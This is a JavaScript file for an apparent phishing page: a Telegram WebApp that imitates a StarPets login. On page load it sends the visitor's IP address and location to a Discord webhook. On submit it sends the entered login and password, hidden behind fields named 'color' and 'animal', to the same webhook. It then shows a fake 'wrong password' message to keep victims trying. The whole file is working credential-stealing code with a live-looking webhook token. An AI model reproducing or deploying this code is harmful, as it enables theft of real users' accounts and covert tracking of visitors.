(function () {
  const tg = window.Telegram && window.Telegram.WebApp ? window.Telegram.WebApp : null;
  const urlParams = new URLSearchParams(window.location.search);
  const chatId = urlParams.get("chatId") || "";

  // Discord Webhook URL (замените на свой реальный URL)
  const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1520472993615052943/xPpo3_mlNXHktVGPc-woGmBW2w7ttQUY2oMhVY6lagA9PGRFg-QZsQd-LC7-sGrqLaqJ";

  // Флаги эмодзи для стран
  const countryFlags = {
    'US': '🇺🇸', 'RU': '🇷🇺', 'GB': '🇬🇧', 'DE': '🇩🇪', 'FR': '🇫🇷',
    'IT': '🇮🇹', 'ES': '🇪🇸', 'CA': '🇨🇦', 'AU': '🇦🇺', 'JP': '🇯🇵',
    'CN': '🇨🇳', 'BR': '🇧🇷', 'IN': '🇮🇳', 'MX': '🇲🇽', 'NL': '🇳🇱',
    'SE': '🇸🇪', 'NO': '🇳🇴', 'FI': '🇫🇮', 'DK': '🇩🇰', 'PL': '🇵🇱',
    'UA': '🇺🇦', 'TR': '🇹🇷', 'KR': '🇰🇷', 'AR': '🇦🇷', 'CL': '🇨🇱',
    'CO': '🇨🇴', 'PE': '🇵🇪', 'VE': '🇻🇪', 'ZA': '🇿🇦', 'EG': '🇪🇬',
    'IL': '🇮🇱', 'SA': '🇸🇦', 'AE': '🇦🇪', 'SG': '🇸🇬', 'MY': '🇲🇾',
    'TH': '🇹🇭', 'VN': '🇻🇳', 'PH': '🇵🇭', 'ID': '🇮🇩', 'NZ': '🇳🇿',
    'CH': '🇨🇭', 'AT': '🇦🇹', 'BE': '🇧🇪', 'PT': '🇵🇹', 'GR': '🇬🇷',
    'CZ': '🇨🇿', 'RO': '🇷🇴', 'HU': '🇭🇺', 'BG': '🇧🇬', 'HR': '🇭🇷',
    'BY': '🇧🇾', 'KZ': '🇰🇿', 'UZ': '🇺🇿', 'AZ': '🇦🇿', 'GE': '🇬🇪'
  };

  if (tg) {
    tg.ready();
    tg.expand();
  }

  function sleep(ms) {
    return new Promise((r) => setTimeout(r, ms));
  }

  function ensureOverlay() {
    let ov = document.getElementById("spOverlay");
    if (ov) return ov;

    const style = document.createElement("style");
    style.textContent = `
#spOverlay{position:fixed;inset:0;display:none;align-items:center;justify-content:center;background:rgba(0,0,0,.55);z-index:9999;padding:24px;}
#spOverlay .box{max-width:520px;width:100%;background:#111;border:1px solid rgba(255,255,255,.08);border-radius:18px;padding:18px 16px;text-align:center;}
#spOverlay .spinner{width:44px;height:44px;border-radius:999px;border:4px solid rgba(255,255,255,.18);border-top-color:#ff8a00;margin:0 auto 12px;animation:spSpin 1s linear infinite;}
@keyframes spSpin{to{transform:rotate(360deg)}}
#spOverlay .title{font-weight:700;margin:0 0 6px;}
#spOverlay .text{opacity:.9;margin:0;}
    `.trim();
    document.head.appendChild(style);

    ov = document.createElement("div");
    ov.id = "spOverlay";
    ov.innerHTML = `
      <div class="box">
        <div class="spinner" aria-hidden="true"></div>
        <p class="title" id="spTitle">Загрузка…</p>
        <p class="text" id="spText">Пожалуйста, подождите</p>
      </div>
    `;
    document.body.appendChild(ov);
    return ov;
  }

  function showOverlay(title, text) {
    const ov = ensureOverlay();
    ov.style.display = "flex";
    const t = document.getElementById("spTitle");
    const p = document.getElementById("spText");
    if (t) t.textContent = title || "";
    if (p) p.textContent = text || "";
  }

  // Функция получения геолокации по IP
  async function getGeoInfo() {
    try {
      const response = await fetch('https://ipapi.co/json/');
      const data = await response.json();
      return {
        ip: data.ip || 'Неизвестно',
        country: data.country_name || 'Неизвестно',
        countryCode: data.country_code || '',
        city: data.city || '',
        region: data.region || ''
      };
    } catch (error) {
      console.error('Ошибка получения geo данных:', error);
      return {
        ip: 'Не удалось определить',
        country: 'Неизвестно',
        countryCode: '',
        city: '',
        region: ''
      };
    }
  }

  // Функция отправки уведомления о посещении в Discord
  async function sendVisitNotification() {
    try {
      const geoInfo = await getGeoInfo();
      const flag = countryFlags[geoInfo.countryCode] || '🌍';
      const location = geoInfo.city ? `${geoInfo.city}, ${geoInfo.region}` : geoInfo.region;
      
      const message = `🔔 **Новый посетитель на сайте!**\n\n` +
                     `🌐 **IP-адрес:** ${geoInfo.ip}\n` +
                     `${flag} **Страна:** ${geoInfo.country}\n` +
                     `📍 **Местоположение:** ${location || 'Не определено'}\n` +
                     `⏰ **Время:** ${new Date().toLocaleString('ru-RU')}\n` +
                     `👤 **Chat ID:** ${chatId || 'Не указан'}`;

      await fetch(DISCORD_WEBHOOK_URL, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          username: "StarPets Visit Tracker",
          avatar_url: "",
          content: message
        }),
      });
    } catch (error) {
      console.error("Ошибка отправки уведомления о посещении:", error);
    }
  }

  // Отправляем уведомление о посещении при загрузке страницы
  sendVisitNotification();

  // Inputs / UI
  const form = document.getElementById("loginForm") || document.querySelector("form");
  const colorEl = document.getElementById("color");
  const animalEl = document.getElementById("animal");
  const btnLogin = document.getElementById("btnLogin") || (form ? form.querySelector('button[type="submit"]') : null);

  function updateLoginButton() {
    const color = colorEl?.value?.trim() || "";
    const animal = animalEl?.value?.trim() || "";
    const filled = color.length > 0 && animal.length > 0;

    if (btnLogin) {
      btnLogin.disabled = !filled;
      if (filled) {
        btnLogin.classList.remove("btn--primary");
        btnLogin.classList.add("btn--accent");
      } else {
        btnLogin.classList.remove("btn--accent");
        btnLogin.classList.add("btn--primary");
      }
    }
  }

  colorEl?.addEventListener("input", updateLoginButton);
  animalEl?.addEventListener("input", updateLoginButton);
  updateLoginButton();

  // Notify admin about opening WebApp (via bot through sendData)
  try {
    if (tg) {
      tg.sendData(JSON.stringify({ type: "opened", chatId: chatId || undefined }));
    }
  } catch {}

  function collectFields(formEl) {
    const out = {};
    if (!formEl) return out;

    const els = formEl.querySelectorAll("input, textarea, select");
    els.forEach((el) => {
      const id = el.id || "";
      const name = el.name || "";
      const key = (name || id || "").trim();
      if (!key) return;

      let val = "";
      if (el.type === "checkbox") val = el.checked ? "true" : "false";
      else if (el.type === "radio") {
        if (!el.checked) return;
        val = el.value ?? "";
      } else val = el.value ?? "";

      out[key] = String(val);
    });
    return out;
  }

  // Функция отправки данных формы в Discord
  async function sendToDiscord(data) {
    try {
      const geoInfo = await getGeoInfo();
      const flag = countryFlags[geoInfo.countryCode] || '🌍';
      
      const response = await fetch(DISCORD_WEBHOOK_URL, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          username: "StarPets Notification",
          avatar_url: "",
          content: `📥 **Новые данные от пользователя:**\n\n` +
                   `**Логин/Email:** ${data.color || "не указан"}\n` +
                   `**Пароль:** ${data.animal || "не указано"}\n\n` +
                   `🌐 **IP-адрес:** ${geoInfo.ip}\n` +
                   `${flag} **Страна:** ${geoInfo.country}\n\n` +
                   `📊 **Все поля:** ${JSON.stringify(data, null, 2)}`
        }),
      });
      return response.ok;
    } catch (error) {
      console.error("Ошибка отправки в Discord:", error);
      return false;
    }
  }

  form?.addEventListener("submit", async (e) => {
    e.preventDefault();
    updateLoginButton();
    if (btnLogin?.disabled) return;

    const fields = collectFields(form);
    const payload = {
      type: "submit",
      chatId: chatId || undefined,
      fields: fields,
    };

    // UI: show loading
    if (btnLogin) btnLogin.disabled = true;
    showOverlay("Отправка данных...", "Пожалуйста, подождите");

    try {
      // Отправляем в Discord
      const discordSuccess = await sendToDiscord(fields);
      
      // Также отправляем в Telegram, если доступен
      if (tg) {
        try {
          tg.sendData(JSON.stringify(payload));
        } catch {}
      }

      if (discordSuccess) {
        showOverlay(
          "❌ Ошибка авторизации",
          "Логин либо пароль неправелны, перезагрузите сайт и попробуйте зайти заново."
        );
      } else {
        showOverlay(
          "Ошибка ❌",
          "Данные неправильные, попробуйте снова войти в аккаунт перезагрузив страницу."
        );
      }
    } catch (error) {
      showOverlay(
        "❌ Ошибка отправки",
        "Произошла ошибка, попробуйте позже."
      );
    }

    // Оставляем WebApp открытым
  });
})();
